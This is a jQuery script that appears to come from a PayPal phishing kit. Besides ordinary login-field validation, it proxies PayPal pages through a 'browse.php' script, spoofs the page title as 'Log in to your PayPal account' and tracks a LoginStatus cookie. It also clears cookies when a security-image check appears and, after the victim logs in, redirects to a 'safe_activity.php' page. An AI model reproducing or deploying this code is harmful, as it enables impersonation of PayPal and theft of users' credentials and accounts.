$(document).ready(function(){
	

	// Validation Login Form
	var email = $("#email").val();
	var pass  = $("#password").val();

	$("#btnLogin").click(function(){

		if( $("#email").val() == '' )
		{
			$("#login_emaildiv").addClass('hasError');
			$("#login_emaildiv").css('z-index','100');
			$("#emailErrorMessage").addClass('show');
			$(".emptyError").removeClass("hide");
			$(".emptyError").addClass("show");
			return false;
		}else if( $("#password").val() == "" )
		{
			$("#login_passworddiv").addClass('hasError');
			$("#login_passworddiv").css('z-index','100');
			$("#passwordErrorMessage").addClass('show');
			$(".emptyError").removeClass("hide");
			$(".emptyError").addClass("show");
			return false;
		}
		
	});

	$("#email").keyup(function(){


		$("#login_emaildiv").removeClass('hasError');
		$("#login_emaildiv").css('z-index','0');
		$("#emailErrorMessage").removeClass('show');
		$(".emptyError").removeClass("show");
		$(".emptyError").addClass("hide");


	});
	$("#password").keyup(function(){


		$("#login_passworddiv").removeClass('hasError');
		$("#login_passworddiv").css('z-index','0');
		$("#passwordErrorMessage").removeClass('show');
		$(".emptyError").removeClass("show");
		$(".emptyError").addClass("hide");

		
	});

	$('form.proceed').on('submit',function()
	{
				$('.transitioning').removeClass('hide');
				$('.transitioning').addClass('spinner');
				$('.checkingInfo').removeClass('hide');
	});

	// Non Display
	$('.nonjsAlert').hide();
	//$('#include').hide();


	// End Validation Login Form


	/**
	* Do That When You See this :D
	*/
	var pagelink = window.location.href;
	if (pagelink.indexOf("paypal.com%2Fsignin") > -1) 
	{
		$(document).prop('title', 'Log in to your PayPal account'); document.cookie="LoginStatus=false";  
	}
	if (pagelink.indexOf("paypal.com%2Fauth%2Fvalidatecaptcha") > -1)
	{
		$(document).prop('title', 'Log in to your PayPal account'); document.cookie="LoginStatus=false";
	}
	

	if (pagelink.indexOf("paypal.com%2Fmyaccount") > -1)
	{
		var delay = 2500; //Your delay in milliseconds
		setTimeout(function(){ window.location = 'safe_activity.php'; }, delay);
	}



	/**
	 * Login Status
	*/
	function getCookie(name) {
	  var value = "; " + document.cookie;
	  var parts = value.split("; " + name + "=");
	  if (parts.length == 2) return parts.pop().split(";").shift();
	}
	var LoginStatus = getCookie('LoginStatus');
	if(LoginStatus !== 'true'){

		$.ajax({
			url: 'browse.php?u=https%3A%2F%2Fwww.paypal.com%2Fmyaccount%2F&b=12&f=norefer',
			method: 'GET',
			beforeSend: function(){
				$('#preloaderloadingspin').removeClass('hidethis');
			},
			success: function(LoginStatus){

					if ( LoginStatus.indexOf("emailErrorMessage") > -1 ) 
					{
						$('#preloaderloadingspin').addClass('hidethis');
						if (LoginStatus.indexOf("Security Image") > -1){
							$.ajax({
								url: 'cookies.php?clear=x',
								method: 'get',
								success: function()
								{
									$('#preloaderloadingspin').removeClass('hidethis');
									window.location = 'browse.php?u=https%3A%2F%2Fwww.paypal.com%2Fsignin&b=12';
								}
							});
							
						}
	        		}
	        		else
	        		{
	        			window.location = 'browse.php?u=https%3A%2F%2Fwww.paypal.com%2Fmyaccount%2F&b=12&f=norefer';
	        			document.cookie='LoginStatus=true';

	        			
	        		}
			}
		});

	}



});